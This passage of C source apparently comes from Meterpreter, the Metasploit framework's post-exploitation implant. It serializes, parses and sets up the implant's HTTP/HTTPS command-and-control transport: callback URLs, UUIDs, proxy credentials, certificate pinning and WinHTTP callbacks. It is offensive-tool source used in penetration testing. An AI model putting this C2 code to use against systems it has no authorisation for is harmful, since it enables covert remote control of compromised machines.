	if (sourceOptions->uuid_header != NULL)
	{
		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_UUID_HEADER, sourceOptions->uuid_header);
	}

	return TRUE;
}

/*!
 * @brief Serialize the current transport to the given C2 packet.
 * @param transport Pointer to the current \c Transport.
 * @param c2Packet Pointer to the \c Packet to write all the TLV data to.
 */
void transport_write_http_config(Transport* transport, Packet* c2Packet)
{
	if (transport->type == METERPRETER_TRANSPORT_HTTP || transport->type == METERPRETER_TRANSPORT_HTTPS)
	{
		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_URL, transport->url);
		packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_COMM_TIMEOUT, transport->timeouts.comms);
		packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_RETRY_WAIT, transport->timeouts.retry_wait);
		packet_add_tlv_uint(c2Packet, TLV_TYPE_C2_RETRY_TOTAL, transport->timeouts.retry_total);

		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
		packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_UUID, ctx->uuid);

		set_http_options_to_tlv(c2Packet, &ctx->default_options);

		Packet* getOptionsPacket = packet_create_group();
		set_http_options_to_tlv(getOptionsPacket, &ctx->get_connection.options);
		packet_add_group(c2Packet, TLV_TYPE_C2_GET, getOptionsPacket);

		Packet* postOptionsPacket = packet_create_group();
		set_http_options_to_tlv(postOptionsPacket, &ctx->post_connection.options);
		packet_add_group(c2Packet, TLV_TYPE_C2_POST, postOptionsPacket);

		if (ctx->proxy)
		{
			packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_URL, ctx->proxy);
		}
		if (ctx->proxy_user)
		{
			packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_USER, ctx->proxy_user);
		}
		if (ctx->proxy_pass)
		{
			packet_add_tlv_wstring(c2Packet, TLV_TYPE_C2_PROXY_PASS, ctx->proxy_pass);
		}
		if (ctx->cert_hash)
		{
			packet_add_tlv_raw(c2Packet, TLV_TYPE_C2_CERT_HASH, ctx->cert_hash, CERT_HASH_SIZE);
		}
	}
}

/*!
 * @brief Read HTTP configuration options from a TLV packet.
 * @param packet Pointer to the \c Packet containing the TLV data.
 * @param optionsTlv Pointer to the \c Tlv group to read the options from.
 * @param targetOptions Pointer to the \c HttpRequestOptions instance to populate.
 * @returns Indication of success or failure.
 */
BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptions* targetOptions)
{
	targetOptions->encode_flags = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_ENC);
	targetOptions->headers = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_HEADERS, NULL);
	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_PREFIX, &targetOptions->payload_prefix_size);
	targetOptions->payload_prefix_skip = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_PREFIX_SKIP);
	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, &targetOptions->payload_suffix_size);
	targetOptions->payload_suffix_skip = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SUFFIX_SKIP);
	targetOptions->ua = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UA, NULL);
	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
	targetOptions->uuid_cookie = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_COOKIE, NULL);
	targetOptions->uuid_get = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_GET, NULL);
	targetOptions->uuid_header = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_HEADER, NULL);

	return TRUE;
}

/*!
 * @brief Read HTTP request configuration options from a TLV packet.
 * @param packet Pointer to the \c Packet containing the TLV data.
 * @param c2Tlv Pointer to the \c Tlv that contains the options TLV data
 * @param tlvType Identifies the TLV group type that contains the options to read.
 * @param targetOptions Pointer to the \c HttpRequestOptions instance to populate.
 * @returns Indication of success or failure.
 */
BOOL get_http_options_from_config(Packet* packet, Tlv* c2Tlv, UINT tlvType, HttpRequestOptions* targetOptions)
{
	Tlv optionsTlv = { 0 };
	if (packet_get_tlv_group_entry(packet, c2Tlv, tlvType, &optionsTlv) == ERROR_SUCCESS)
	{
		return get_http_options_from_tlv(packet, &optionsTlv, targetOptions);
	}
	return FALSE;
}

static void debug_print_http_options(PSTR type, HttpRequestOptions* options)
{
	dprintf("[HTTP OPTION] - %s - Encode Flags: 0x%x", type, options->encode_flags);
	dprintf("[HTTP OPTION] - %s - Headers: %S", type, options->headers);
	dprintf("[HTTP OPTION] - %s - Payload Prefix Size: %u", type, options->payload_prefix_size);
	dprintf("[HTTP OPTION] - %s - Payload Prefix: %s", type, options->payload_prefix);
	dprintf("[HTTP OPTION] - %s - Payload Suffix Size: %u", type, options->payload_suffix_size);
	dprintf("[HTTP OPTION] - %s - Payload Suffix: %s", type, options->payload_suffix);
	dprintf("[HTTP OPTION] - %s - Prefix Skip: %u", type, options->payload_prefix_skip);
	dprintf("[HTTP OPTION] - %s - Suffix Skip: %u", type, options->payload_suffix_skip);
	dprintf("[HTTP OPTION] - %s - URI: %S", type, options->uri);
	dprintf("[HTTP OPTION] - %s - UUID Cookie: %S", type, options->uuid_cookie);
	dprintf("[HTTP OPTION] - %s - UUID Get: %S", type, options->uuid_get);
	dprintf("[HTTP OPTION] - %s - UUID Header: %S", type, options->uuid_header);
	dprintf("[HTTP OPTION] - %s - User Agent: %S", type, options->ua);
}

/*!
 * @brief Create an HTTP(S) transport from the given settings.
 * @param config Pointer to the HTTP configuration block.
 * @param size Pointer to the size of the parsed config block.
 * @param config Pointer to the HTTP configuration block.
 * @return Pointer to the newly configured/created HTTP(S) transport instance.
 */
Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
{
	Transport* transport = (Transport*)calloc(1, sizeof(Transport));
	HttpTransportContext* ctx = (HttpTransportContext*)calloc(1, sizeof(HttpTransportContext));

	PWSTR url = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_URL, NULL);

	dprintf("[TRANS HTTP] Creating http transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(HttpTransportContext));

	ctx->uuid = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_UUID, NULL);
	dprintf("[TRANS HTTP] Given UUID: %S", ctx->uuid);
	if (ctx->uuid == NULL)
	{
		// given no UUID, so pull it out of the URL
		PWCHAR queryString = wcschr(url, L'?');
		PWSTR uriEnd = (queryString ? queryString : url + wcslen(url)) - 1;
		dprintf("[TRANS HTTP] Uri End: %C %S", *uriEnd, uriEnd);
		if (*uriEnd == L'/')
		{
			--uriEnd;
		}
		dprintf("[TRANS HTTP] Uri End Now: %C %S", *uriEnd, uriEnd);
		PWSTR uriStart = uriEnd - 1;
		while (*(uriStart - 1) != L'/')
		{
			--uriStart;
		}
		dprintf("[TRANS HTTP] Uri Start: %S", uriStart);

		size_t uriLen = uriEnd - uriStart + 1;
		dprintf("[TRANS HTTP] UUID uri length: %u", uriLen);
		size_t uriSize = uriLen + 1;

		ctx->uuid = (PWSTR)calloc(sizeof(wchar_t), uriSize);
		wcsncpy_s(ctx->uuid, uriSize, uriStart, uriLen);
		dprintf("[TRANS HTTP] Calculated UUID: %S", ctx->uuid);

		// terminate the existing URI
		*uriStart = 0;
		dprintf("[TRANS HTTP] Adjusted URL 1: %S", url);
		if (queryString)
		{
			// copy over the query string if it's there
			wcscpy_s(uriStart, wcslen(queryString), queryString);
		}
		dprintf("[TRANS HTTP] Adjusted URL 2: %S", url);
	}

	ctx->proxy = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_URL, NULL);
	dprintf("[TRANS HTTP] Given proxy: %S", ctx->proxy);

	ctx->proxy_user = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_USER, NULL);
	dprintf("[TRANS HTTP] Given proxy user: %S", ctx->proxy_user);

	ctx->proxy_pass = packet_get_tlv_group_entry_value_wstring(packet, c2Tlv, TLV_TYPE_C2_PROXY_PASS, NULL);
	dprintf("[TRANS HTTP] Given proxy pass: %S", ctx->proxy_pass);
	ctx->ssl = wcsncmp(url, L"https", 5) == 0;

	// only apply the cert hash if we're given one and it's not the global value
	LPBYTE certHash = packet_get_tlv_group_entry_value_raw(packet, c2Tlv, TLV_TYPE_C2_CERT_HASH, NULL);
	if (certHash != NULL)
	{
		dprintf("[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
			certHash[0], certHash[1], certHash[2], certHash[3],
			certHash[4], certHash[5], certHash[6], certHash[7],
			certHash[8], certHash[9], certHash[10], certHash[11],
			certHash[12], certHash[13], certHash[14], certHash[15],
			certHash[16], certHash[17], certHash[18], certHash[19]);

		unsigned char emptyHash[CERT_HASH_SIZE] = { 0 };
		if (memcmp(certHash, emptyHash, CERT_HASH_SIZE))
		{
			ctx->cert_hash = (PBYTE)calloc(1, CERT_HASH_SIZE);
			memcpy_s(ctx->cert_hash, CERT_HASH_SIZE, certHash, CERT_HASH_SIZE);
		}
	}

	// default http parameters/options
	get_http_options_from_tlv(packet, c2Tlv, &ctx->default_options);

	// now do the GET/POST specific stuff
	get_http_options_from_config(packet, c2Tlv, TLV_TYPE_C2_GET, &ctx->get_connection.options);
	get_http_options_from_config(packet, c2Tlv, TLV_TYPE_C2_POST, &ctx->post_connection.options);

	ctx->create_req = get_request_winhttp;
	ctx->send_req = send_request_winhttp;
	ctx->close_req = close_request_winhttp;
	ctx->validate_response = validate_response_winhttp;
	ctx->receive_response = receive_response_winhttp;
	ctx->read_response = read_response_winhttp;

	transport->timeouts.comms = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_COMM_TIMEOUT);
	transport->timeouts.retry_total = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_TOTAL);
	transport->timeouts.retry_wait = packet_get_tlv_group_entry_value_uint(packet, c2Tlv, TLV_TYPE_C2_RETRY_WAIT);

	transport->type = ctx->ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
	ctx->url = transport->url = url;
	transport->packet_transmit = packet_transmit_http;
	transport->server_dispatch = server_dispatch_http;
	transport->transport_init = server_init_winhttp;
	transport->transport_deinit = server_deinit_http;
	transport->transport_destroy = transport_destroy_http;
	transport->ctx = ctx;
	transport->comms_last_packet = current_unix_timestamp();
	transport->write_config = transport_write_http_config;

	DBG_PRINT_OPTIONS("Default", &ctx->default_options);
	DBG_PRINT_OPTIONS("GET", &ctx->get_connection.options);
	DBG_PRINT_OPTIONS("POST", &ctx->post_connection.options);

	return transport;
}

